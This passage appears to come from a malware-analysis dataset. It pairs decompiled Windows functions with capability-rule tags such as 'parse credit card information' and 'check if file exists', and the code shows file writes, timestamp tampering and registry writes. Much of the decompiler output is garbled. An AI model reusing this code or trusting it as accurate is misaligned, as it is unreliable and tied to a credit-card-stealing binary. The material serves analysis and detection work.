        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403bbf) overlaps instruction at (ram,0x00403bbe)\n// \n\nuint __cdecl fcn.00403b10(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uchar *puVar1;\n    int32_t arg_8h_00;\n    int32_t extraout_ECX;\n    int32_t iVar2;\n    int32_t extraout_ECX_00;\n    int32_t unaff_EBX;\n    int32_t unaff_EDI;\n    bool bVar3;\n    uint64_t uVar4;\n    uint var_4h;\n    \n    *0x424738 = fcn.00401f30();\n    arg_8h_00 = (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0x40000000, 1, 0, 2, 0x80, 0);\n    if (arg_8h_00 == -1) {\n        return 0;\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_WriteFile)(arg_8h_00, arg_ch, arg_10h, &var_4h, 0);\n    bVar3 = (POPCOUNT(uVar4 & 0xff) & 1U) == 0;\n    if (uVar4 != 0) {\n        iVar2 = extraout_ECX;\n        if (((bVar3) || (!bVar3)) && (uVar4 = uVar4 & 0xffffffff00000000 | *0x424738,  *0x424738 != 0)) {\n            uVar4 = fcn.00403a70(arg_8h_00);\n            *0x424738 = uVar4 == 0;\n            uVar4 = uVar4 & 0xffffffff00000000 | *0x424738;\n            iVar2 = extraout_ECX_00;\n        }\n        *(iVar2 + 0x424738) = *(iVar2 + 0x424738) & 0xffffff85;\n        *(unaff_EBX + 0x56 + (uVar4 >> 0x20)) = 0;\n        *0x83fffffe = uVar4;\n        puVar1 = *(unaff_EDI + arg_8h_00 * 8) + -0x5d;\n        *puVar1 = *puVar1;\n        *(unaff_EBX + 0x56) = *(unaff_EBX + 0x56) + (uVar4 >> 0x20) + '\\x01';\n        fcn.00403f20(0, arg_8h_00);\n        if (*0x424738 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(arg_8h_00);\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 637
    },
    "00403f20": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404019) overlaps instruction at (ram,0x00404017)\n// \n// WARNING: Removing unreachable block (ram,0x00404016)\n\nuint fcn.00403f20(uint param_1, uchar *param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    ushort extraout_DX;\n    ushort uVar5;\n    uchar *puVar6;\n    uint *puVar7;\n    uchar *puVar8;\n    char *pcVar9;\n    char *pcVar10;\n    char *pcVar11;\n    uint *puVar12;\n    bool bVar13;\n    unkbyte6 Var14;\n    char cStack560;\n    uint uStack559;\n    uchar uStack300;\n    uint uStack299;\n    uchar auStack40 [4];\n    uchar auStack36 [8];\n    uchar auStack28 [8];\n    uchar auStack20 [16];\n    \n    cStack560 = '\\0';\n    uStack300 = '\\0';\n    puVar7 = &uStack559;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    puVar7 = &uStack300 + 1;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&cStack560, 0x104);\n    uVar3 = 0xffffffff;\n    pcVar10 = &cStack560;\n    do {\n        pcVar9 = pcVar10;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar9 = pcVar10 + 1;\n        cVar1 = *pcVar10;\n        pcVar10 = pcVar9;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar7 = pcVar9 + -uVar3;\n    puVar12 = &uStack300;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar12 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar12 = puVar12 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar12 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar12 = puVar12 + 1;\n    }\n    uVar3 = 0xffffffff;\n    pcVar10 = 0x407048;\n    do {\n        pcVar9 = pcVar10;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar9 = pcVar10 + 1;\n        cVar1 = *pcVar10;\n        pcVar10 = pcVar9;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar10 = &uStack300;\n    do {\n        pcVar11 = pcVar10;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar11 = pcVar10 + 1;\n        cVar1 = *pcVar10;\n        pcVar10 = pcVar11;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar9 + -uVar3;\n    puVar12 = pcVar11 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar12 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar12 = puVar12 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar12 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar12 = puVar12 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&uStack300, 0, auStack40);\n    bVar13 = param_2 == 0xffffffff;\n    puVar6 = param_2;\n    uVar5 = extraout_DX;\n    if (bVar13) {\n        Var14 = fcn.004013e0(param_1);\n        uVar5 = Var14 >> 0x20;\n        puVar6 = Var14;\n        bVar13 = puVar6 == 0xffffffff;\n        if (bVar13) {\n            return 0;\n        }\n    }\n    puVar8 = param_2;\n    if ((!bVar13) && (bVar13)) {\n        puVar8 = param_2 + 1;\n        out(*param_2, uVar5);\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(puVar6, auStack36, auStack28, auStack20);\n    if (puVar8 == 0xffffffff) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(puVar6);\n    }\n    return 1;\n}\n",
        "token_count": 1313
    },
    "00404260": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00404260(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n    if (iVar1 != -1) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 72
    },
    "00404930": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004049cb) overlaps instruction at (ram,0x004049c2)\n// \n// WARNING: Removing unreachable block (ram,0x004049bc)\n\nuint __cdecl fcn.00404930(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    bool bVar6;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_108h;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    iVar2 = (**0x42472c)(2, 0);\n    if (iVar2 == -1) {\n        return 0xffffffff;\n    }\n    var_12ch = 0x128;\n    puVar5 = &var_128h;\n    for (iVar4 = 0x49; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    iVar4 = iVar2;\n    iVar3 = (**0x424730)(iVar2, &var_12ch);\n    pcVar1 = _sym.imp.MSVCRT.dll__stricmp;\n    do {\n        if (iVar3 == 0) {\ncode_r0x00404a10:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n            return var_4h;\n        }\n    // WARNING: Bad instruction - Truncating control flow here\n        iVar3 = (*pcVar1)(&var_108h, arg_8h);\n        bVar6 = iVar3 == 0;\n        if (bVar6) {\n            if ((!bVar6) && (bVar6)) {\n                iVar2 = iVar4;\n            }\n            var_4h = var_124h;\n            goto code_r0x00404a10;\n        }\n        iVar3 = (**0x424734)();\n    } while( true );\n}\n",
        "token_count": 470
    },
    "004015a0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401655) overlaps instruction at (ram,0x00401654)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004015a0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    code cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    code *pcVar7;\n    uint *puVar8;\n    bool bVar9;\n    bool bVar10;\n    bool bVar11;\n    ulong uVar12;\n    ushort uVar13;\n    uchar var_24h;\n    uint var_23h;\n    uint *var_4h;\n    \n    uVar12 = fcn.004010a0(arg_18h, arg_1ch, 0x407054, 7);\n    uVar4 = uVar12 >> 0x20;\n    var_4h = uVar12;\n    if (uVar12 == NULL) {\n        return 0;\n    }\n    var_24h = 0;\n    puVar6 = &var_23h;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    bVar9 = false;\n    bVar11 = false;\n    uVar5 = 0;\n    bVar10 = true;\n    pcVar7 = _sym.imp.MSVCRT.dll_rand;\n    do {\n        if (bVar11) {\ncode_r0x00401655:\n            uVar12 = (*pcVar7)();\n            uVar4 = uVar12 >> 0x20;\n            uVar2 = uVar12 & 0x800000ff;\n            if (uVar2 < 0) goto code_r0x0040164a;\n        }\n        else {\n            uVar13 = uVar4;\n            uVar4 = uVar4 & 0xffff;\n            if (!bVar11) goto code_r0x00401655;\n            cVar1 = in(uVar13);\n            *pcVar7 = cVar1;\n            pcVar7 = pcVar7 + 1;\n            if (!bVar9 && !bVar10) goto code_r0x004016c0;\ncode_r0x0040164a:\n            *0xff25d7ff = *0xff25d7ff + -1;\n            uVar2 = 0;\n        }\n        (&var_24h)[uVar5] = uVar2;\n        uVar5 = uVar5 + 1;\n        bVar9 = uVar5 < 0x20;\n        bVar11 = SBORROW4(uVar5, 0x20);\n        bVar10 = uVar5 == 0x20;\n    } while (bVar9);\n    puVar6 = &var_24h;\n    puVar8 = var_4h;\n    for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar8 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    fcn.00401230(arg_8h, arg_ch, arg_10h, arg_14h, &var_24h, 0x20, var_4h);\ncode_r0x004016c0:\n    fcn.004016e0(arg_18h, arg_1ch);\n    return 1;\n}\n",
        "token_count": 860
    },
    "00401880": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004018c5) overlaps instruction at (ram,0x004018c3)\n// \n\nbool fcn.00401880(void)\n\n{\n    int32_t *piVar1;\n    char cVar4;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    uint32_t uVar5;\n    uchar *puVar6;\n    uint *unaff_ESI;\n    int32_t unaff_EDI;\n    char *pcVar7;\n    bool bVar8;\n    uint8_t in_AF;\n    ulong uVar9;\n    uint32_t uStack8;\n    \n    uStack8 = 0;\n    uVar9 = fcn.004040e0(&uStack8);\n    pcVar7 = uVar9 >> 0x20;\n    uVar5 = uVar9;\n    bVar8 = (POPCOUNT(uVar5 & 0xff) & 1U) != 0;\n    if (uVar5 == 0) {\n        return false;\n    }\n    uVar2 = uStack8;\n    puVar6 = &stack0xfffffffc;\n    if ((bVar8) && (puVar6 = &stack0xfffffffc,  !bVar8)) {\n        out(*unaff_ESI, uVar9 >> 0x20);\n        do {\n            cVar4 = uVar5 >> 8;\n            in_AF = 9 < (uVar5 & 0xf) | in_AF;\n            uVar5 = CONCAT31(CONCAT21(uVar5 >> 0x10, cVar4 - in_AF), -in_AF);\n        } while (in_AF || cVar4 == *pcVar7);\n        piVar1 = unaff_EDI + pcVar7 * 2;\n        *piVar1 = (*piVar1 + 0x7b) - in_AF;\n        *(extraout_ECX + -0x75) = uVar5;\n        uVar2 = uVar5;\n        puVar6 = &stack0xfffffffd;\n    }\n    if (uVar2 == 0) {\n        return false;\n    }\n    uVar5 = 0xffffffff;\n    pcVar7 = *(puVar6 + -4);\n    do {\n        if (uVar5 == 0) break;\n        uVar5 = uVar5 - 1;\n        cVar4 = *pcVar7;\n        pcVar7 = pcVar7 + 1;\n    } while (cVar4 != '\\0');\n    iVar3 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4071d8, 0x407218, 1, *(puVar6 + -4), ~uVar5 - 1);\n    return iVar3 == 0;\n}\n",
        "token_count": 623
    },
    "00402dc0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402f29) overlaps instruction at (ram,0x00402f28)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00402e2a)\n// WARNING: Removing unreachable block (ram,0x00402de5)\n// WARNING: Removing unreachable block (ram,0x00402dea)\n// WARNING: Removing unreachable block (ram,0x00403442)\n// WARNING: Removing unreachable block (ram,0x00403484)\n// WARNING: Removing unreachable block (ram,0x00403444)\n\nvoid fcn.00402dc0(void)\n\n{\n    code *pcVar1;\n    unkbyte3 Var2;\n    uint8_t uVar3;\n    uint16_t uVar4;\n    uint8_t extraout_AH;\n    uint8_t *in_EAX;\n    uint32_t *puVar6;\n    uint32_t *puVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    uint8_t extraout_CL;\n    ushort extraout_CX;\n    char extraout_CH;\n    uint32_t extraout_ECX;\n    char cVar11;\n    int32_t extraout_ECX_00;\n    uint8_t uVar12;\n    int32_t extraout_ECX_01;\n    char extraout_CH_00;\n    int32_t extraout_ECX_02;\n    uint extraout_ECX_03;\n    uint8_t extraout_CH_01;\n    uint extraout_ECX_04;\n    uint extraout_ECX_05;\n    int32_t extraout_ECX_06;\n    uint extraout_ECX_07;\n    uint extraout_ECX_08;\n    char extraout_CH_02;\n    uint extraout_ECX_09;\n    ushort extraout_DX;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t *piVar13;\n    uint extraout_EDX_01;\n    int32_t extraout_EDX_02;\n    uint unaff_EBX;\n    uint *puVar14;\n    int32_t iVar15;\n    uint32_t *puVar16;\n    uint *puVar17;\n    uint *puVar18;\n    uint *puVar19;\n    uint *puVar20;\n    uint *puVar21;\n    int32_t unaff_EBP;\n    uint *unaff_ESI;\n    uint *puVar22;\n    uint8_t **unaff_EDI;\n    uint8_t **ppuVar23;\n    uint8_t *puVar24;\n    uint16_t in_ES;\n    uchar in_CF;\n    bool bVar25;\n    uint8_t in_AF;\n    bool bVar26;\n    uchar uVar27;\n    char in_SF;\n    char cVar28;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    char in_OF;\n    char cVar29;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    unkbyte10 extraout_ST0;\n    unkbyte10 extraout_ST0_00;\n    ulong uVar30;\n    ulong uVar31;\n    unkbyte6 Var32;\n    uint8_t in_stack_00000018;\n    uint in_stack_ffffffac;\n    uint in_stack_ffffffb0;\n    uint32_t uVar33;\n    uint in_stack_ffffffbc;\n    uint in_stack_ffffffc0;\n    uint32_t uVar34;\n    uint8_t *puVar35;\n    uint in_stack_ffffffcc;\n    int32_t in_stack_ffffffd0;\n    uint arg_14h;\n    uint uVar36;\n    uint8_t *puVar37;\n    uint uVar38;\n    uint uVar39;\n    uint uVar40;\n    char *pcVar5;\n    \n    ppuVar23 = unaff_EDI;\n    if ((in_OF == in_SF) && (in_OF != in_SF)) {\n        out(0xc4, in_EAX);\n        ppuVar23 = unaff_EDI + 1;\n        *unaff_EDI = in_EAX;\n        in_CF = unaff_EBX >> 8 < *in_EAX;\n    }\n    uVar40 = 10;\n    uVar39 = 0x407024;\n    uVar38 = 10;\n    puVar37 = 0x407490;\n    uVar36 = 0x402df7;\n    uVar30 = fcn.00403eb0(0x407490, 10, 0x407024, 10);\n    if ((in_CF) || (!in_CF)) {\n        uVar36 = 0x12;\n        in_stack_ffffffd0 = 0x407030;\n        in_stack_ffffffcc = 10;\n    }\n    puVar24 = ppuVar23 ^ *(ppuVar23 + 0xe58be73);\n    puVar35 = uVar30 + 0x40;\n    *puVar35 = *puVar35 ^ uVar30 >> 0x28;\n    pcVar5 = (uVar30 >> 0x20) + 10;\n    cVar29 = SCARRY1(*pcVar5, extraout_CH);\n    *pcVar5 = *pcVar5 + extraout_CH;\n    cVar28 = *pcVar5 < '\\0';\n    puVar35 = 0x407490;\n    uVar34 = 0x402e1b;\n    uVar30 = fcn.00403eb0(0x407490, in_stack_ffffffcc, in_stack_ffffffd0, uVar36);\n    uVar33 = extraout_ECX;\n    if (cVar29 == cVar28) {\n        uVar34 = uVar34 & 0xffff | extraout_ECX << 0x10;\n        uVar33 = extraout_ECX & 0xffff;\n        cVar11 = (extraout_ECX << 0x10) >> 0x18;\n        if (cVar29 == cVar28) goto code_r0x00402e30;\n        unaff_ESI = uVar30;\n        if (!SCARRY4(&stack0xffffffbb, 1)) goto code_r0x00402e36;\ncode_r0x00402e80:\n        fcn.00403eb0(0x407490, 10, 0x407054, 7);\n        uVar40 = 0xb;\n        uVar39 = 0x40705c;\n        uVar38 = 10;\ncode_r0x00402ea5:\n        fcn.00403eb0(0x407490, uVar38, uVar39, uVar40);\n        fcn.00403eb0(0x407490, 10, 0x407068, 0xc);\n        puVar35 = puVar24;\n        in_stack_ffffffd0 = unaff_EBP;\n        puVar37 = unaff_EBP + 0x68126a76;\n    }\n    else {\ncode_r0x00402e30:\n        cVar11 = uVar33 >> 8;\n        uVar34 = 4;\n        in_stack_ffffffc0 = 0x407044;\n        in_stack_ffffffbc = 10;\ncode_r0x00402e36:\n        pcVar5 = (uVar30 >> 0x20) + 10;\n        *pcVar5 = *pcVar5 + cVar11;\n        bVar25 = (POPCOUNT(*pcVar5) & 1U) == 0;\n        uVar33 = 0x402e43;\n        uVar30 = fcn.00403eb0(0x407490, in_stack_ffffffbc, in_stack_ffffffc0, uVar34);\n        pcVar5 = uVar30 >> 0x20;\n        uVar36 = uVar30;\n        cVar28 = extraout_ECX_00 >> 8;\n        if ((bVar25) || (uVar33 = uVar33 & 0xffff | unaff_ESI << 0x10,  !bVar25)) {\n            uVar33 = 0xc;\n            in_stack_ffffffb0 = 0x407048;\n            in_stack_ffffffac = 10;\ncode_r0x00402e60:\n            pcVar5[10] = pcVar5[10] + cVar28;\n            fcn.00403eb0(0x407490, in_stack_ffffffac, in_stack_ffffffb0, uVar33);\n            goto code_r0x00402e80;\n        }\n        out(*unaff_ESI, uVar30 >> 0x20);\n        do {\n            cVar29 = uVar36 >> 8;\n            in_AF = 9 < (uVar36 & 0xf) | in_AF;\n            Var2 = CONCAT21(uVar36 >> 0x10, cVar29 - in_AF);\n            uVar36 = CONCAT31(Var2, -in_AF);\n        } while (in_AF || cVar29 == *pcVar5);\n        piVar13 = puVar24 + pcVar5 * 2;\n        *piVar13 = (*piVar13 + 0x7b) - in_AF;\n        *(extraout_ECX_00 + 0x6a) = uVar36;\n        bVar25 = SBORROW4(CONCAT31(Var2, -in_AF) | 0x68, 1);\n        if (!bVar25) goto code_r0x00402e60;\n        if (!bVar25) {\n            pcVar5[10] = pcVar5[10] + cVar28;\n            goto code_r0x00402ea5;\n        }\n    }\n    fcn.00403eb0(0x407490, 10, 0x407074, 8);\n    cVar29 = '\\0';\n    cVar28 = '\\0';\n    bVar25 = (puVar37 & 0x4d) == 0;\n    uVar36 = 0x402f13;\n    fcn.00403eb0(0x407490, 10, 0x40707c, 0xd);\n    if ((bVar25 || cVar29 != cVar28) || (!bVar25 && cVar29 == cVar28)) {\n        uVar36 = 0x18;\n    }\n    while( true ) {\n        fcn.00403eb0(0x407490, 10, 0x40708c, uVar36);\n        bVar25 = false;\n        puVar6 = fcn.00403eb0(0x407490, 10, 0x4070a4, 0x25);\n        if ((bVar25) || (iVar8 = extraout_ECX_01,  !bVar25)) break;\n        do {\n            puVar7 = puVar6 + 1;\n            uVar36 = 0xb7f8c08b;\n            if (&stack0xffffffd8 < *puVar6 || puVar7 == NULL) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            uVar12 = iVar8 >> 8 | *(puVar6 + -0x6f);\n            iVar8 = uVar12 << 8;\n            puVar6 = puVar7;\n        } while (uVar12 == 0);\n        uVar3 = puVar7 + uVar12;\n        pcVar5 = puVar7 & 0xffffff00 | uVar3;\n        if (SCARRY1(puVar7, uVar12) == uVar3 < '\\0') {\n            *pcVar5 = *pcVar5 + uVar3;\n        }\n        else {\n            pcVar1 = swi(0x1f);\n            (*pcVar1)();\n        }\n    }\n    fcn.00403eb0(0x407490, 10, 0x4070cc, 10);\n    bVar25 = false;\n    uVar36 = 0x402fb1;\n    uVar30 = fcn.00403eb0(0x407490, 10, 0x4070d8, 0xc);\n    if ((bVar25) || (!bVar25)) {\n        uVar36 = 0xd;\n    }\n    *puVar37 = *puVar37 & 0xc3;\n    piVar13 = (uVar30 >> 0x20) + 0xd;\n    cVar29 = SBORROW4(*piVar13, in_stack_ffffffd0);\n    iVar8 = *piVar13;\n    cVar28 = iVar8 - in_stack_ffffffd0 < 0;\n    bVar25 = iVar8 == in_stack_ffffffd0;\n    uVar33 = 0x402fd4;\n    iVar8 = fcn.00403eb0(0x407490, 10, 0x4070e4, uVar36);\n    if ((bVar25 || cVar29 != cVar28) || (!bVar25 && cVar29 == cVar28)) {\n        uVar33 = 6;\n    }\n    else {\n        puVar37 = puVar37 + 1;\n        *(iVar8 + 0x6a39da56) = *(iVar8 + 0x6a39da56) ^ extraout_CL;\n        uVar33 = uVar33 & 0xffff0000 | in_ES;\n    }\n    uVar38 = 0x407490;\n    uVar36 = 0x402ff9;\n    fcn.00403eb0(0x407490, 10, 0x4070f4, uVar33);\n    uVar12 = fcn.00403eb0(0x407490, 10, 0x4070fc, 5);\n    puVar24 = puVar35 + 1;\n    cVar28 = uVar12 - *puVar35;\n    uVar33 = (in_NT & 1) * 0x4000 | SBORROW1(uVar12, *puVar35) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n             (cVar28 < '\\0') * 0x80 | (cVar28 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar28) & 1U) == 0) * 4\n             | uVar12 < *puVar35 | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n             (in_AC & 1) * 0x40000;\n    func_0x10188fba();\n    uVar40 = 0x407104;\n    uVar39 = 10;\n    uVar4 = fcn.00403eb0(0x407490, 10, 0x407104, uVar33);\n    bVar25 = (uVar4 ^ puVar37) < 0;\n    arg_14h = 0x403076;\n    uVar31 = fcn.00403eb0(0x407490, 10, 0x407114, 0x19);\n    if ((bVar25) || (!bVar25)) {\n        arg_14h = 0xf;\n        uVar40 = 0x407130;\n        uVar39 = 10;\n    }\n    pcVar5 = (uVar31 >> 0x20) + 10;\n    *pcVar5 = *pcVar5 + extraout_CH_00;\n    fcn.00403eb0(0x407490, uVar39, uVar40, arg_14h);\n    fcn.00403eb0(0x407490, 10, 0x407140, 0xe);\n    uVar33 = (puVar37 >> 8 & 0xffff00) << 8;\n    uVar34 = puVar37 & 0xffff;\n    puVar37 = uVar33 | uVar34;\n    fcn.00403eb0(0x407490, 10, 0x407150, 0xb);\n    uVar4 = fcn.00403eb0(0x407490, 10, 0x40715c, 0xb);\n    uVar9 = ((uVar4 & 0xff00 | uVar4 & uVar34 >> 8) ^ 0x6200) - 0x3488 & 0x7ee5;\n    bVar25 = CARRY4(uVar9, uVar9);\n    uVar39 = fcn.00403eb0(0x407490, 10, 0x407168, 0xb);\n    if ((!bVar25) && (bVar25)) {\n        out(0xbd, uVar39);\n        return;\n    }\n    fcn.00403eb0(0x407490, 10, 0x407174, 10);\n    uVar12 = fcn.00403eb0(0x407490, 10, 0x407180, 0xc);\n    cVar28 = uVar12 - *puVar24;\n    uVar9 = (in_NT & 1) * 0x4000 | SBORROW1(uVar12, *puVar24) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n            (cVar28 < '\\0') * 0x80 | (cVar28 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar28) & 1U) == 0) * 4 |\n            uVar12 < *puVar24 | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n            (in_AC & 1) * 0x40000;\n    puVar22 = uVar30 + -0x1bf31dd8;\n    func_0x1018912d();\n    iVar8 = extraout_EDX + 0xe;\n    fcn.00403eb0(0x407490, 10, 0x40718c, uVar9);\n    fcn.00403eb0(0x407490, 10, 0x40719c, 0x11);\n    fcn.00403eb0(0x407490, 10, 0x4071b0, 0x13);\n    fcn.00403eb0(0x407490, 10, 0x4071c4, 0x14);\n    fcn.00403eb0(0x407490, 10, 0x4071d8, 0x33);\n    fcn.00403eb0(0x407490, 10, 0x40720c, 10);\n    puVar19 = puVar22;\n    iVar10 = fcn.00403eb0(0x407490, 10, 0x407218, 4);\n    bVar25 = (POPCOUNT(iVar10 - extraout_ECX_02 & 0xff) & 1U) == 0;\n    fcn.00403eb0(0x407490, 10, 0x40721c, 5);\n    uVar12 = extraout_ECX_03 >> 8;\n    if ((bVar25) || (uVar39 = extraout_ECX_03,  !bVar25)) {\n        uVar39 = 6;\n        iVar8 = 0x407224;\n        puVar19 = 0xa;\n    }\n    *(extraout_EDX_00 + 6) = *(extraout_EDX_00 + 6) + -0x68;\n    puVar24 = extraout_EDX_00 + 10;\n    bVar25 = CARRY1(*puVar24, uVar12);\n    *puVar24 = *puVar24 + uVar12;\n    bVar26 = *puVar24 == 0;\n    uVar40 = 0x4032ca;\n    uVar31 = fcn.00403eb0(0x407490, puVar19, iVar8, uVar39);\n    iVar10 = uVar31 >> 0x20;\n    iVar8 = uVar31;\n    if ((bVar25 || bVar26) || (!bVar25 && !bVar26)) {\n        uVar40 = 0x2a;\n        uVar38 = 0x407258;\n        uVar36 = 10;\n        uVar12 = extraout_CH_01;\ncode_r0x004032ea:\n        pcVar5 = iVar10 + 10;\n        *pcVar5 = *pcVar5 + uVar12;\n        bVar25 = *pcVar5 < '\\0';\n        uVar39 = 0x4032f7;\n        fcn.00403eb0(0x407490, uVar36, uVar38, uVar40);\n        if ((bVar25) || (!bVar25)) {\n            uVar39 = 0xb;\n        }\n        *puVar37 = *puVar37 & 0xc3;\n        fcn.00403eb0(0x407490, 10, 0x407284, uVar39);\n        return;\n    }\n    puVar24 = puVar35 + 6;\n    puVar19 = uVar30 + 0xe40ce22c;\n    *(puVar35 + 2) = *puVar22;\n    puVar37 = uVar33 | CONCAT11(0xdf, uVar34);\n    uVar33 = 0x6ae181d0;\n    uVar12 = extraout_CH_01 - in_stack_00000018;\n    if (in_stack_00000018 <= extraout_CH_01) goto code_r0x004032ea;\n    *(iVar8 + -4) = puVar37;\n    *(iVar8 + -8) = puVar19;\n    *(iVar8 + -0xc) = puVar24;\n    *(iVar8 + -0x10) = iVar10;\n    *(iVar8 + -0x12) = *0x10 + -0x40;\n    cVar29 = '\\0';\n    cVar28 = (puVar24 & ((uVar31 >> 0x20) - (*0x10 + -0x40)) + 0x1abU) < 0;\n    *(iVar8 + -0x10) = 0x11;\n    *(iVar8 + -0x14) = 0x407010;\n    *(iVar8 + -0x18) = 10;\n    puVar14 = iVar8 + -0x1c;\n    *(iVar8 + -0x1c) = 0x407490;\n    *(iVar8 + -0x20) = 0x403360;\n    uVar30 = fcn.00403eb0(*(iVar8 + -0x1c), *(iVar8 + -0x18), *(iVar8 + -0x14), *(iVar8 + -0x10));\n    piVar13 = uVar30 >> 0x20;\n    if ((cVar29 != cVar28) || (cVar29 == cVar28)) {\n        puVar14 = iVar8 + -0x20;\n        *(iVar8 + -0x20) = 0xf;\n    }\n    *(uVar30 + -0x7ce92414) = extraout_ST0;\n    puVar14[-1] = puVar37;\n    in_AF = 9 < (uVar30 - 1U & 0xf) | in_AF;\n    *piVar13 = *piVar13 + 0xf6adf84;\n    puVar14[-2] = 0x40722c;\n    puVar14[-3] = 10;\n    puVar14[-4] = 0x407490;\n    puVar14[-5] = 0x403388;\n    fcn.00403eb0(puVar14[-4], puVar14[-3], puVar14[-2], puVar14[-1]);\n    puVar14[3] = extraout_ECX_04;\n    puVar14[3] = 0x1a;\n    puVar14[2] = 0x40723c;\n    puVar14[1] = 10;\n    *puVar14 = 0x407490;\n    puVar14[-1] = 0x4033a9;\n    uVar4 = fcn.00403eb0(*puVar14, puVar14[1], puVar14[2], puVar14[3]);\n    puVar14[3] = extraout_ECX_05;\n    puVar14[2] = puVar24;\n    *(puVar14 + 6) = uVar4;\n    bVar25 = (POPCOUNT((puVar24 & uVar4) + 0xaf70 & 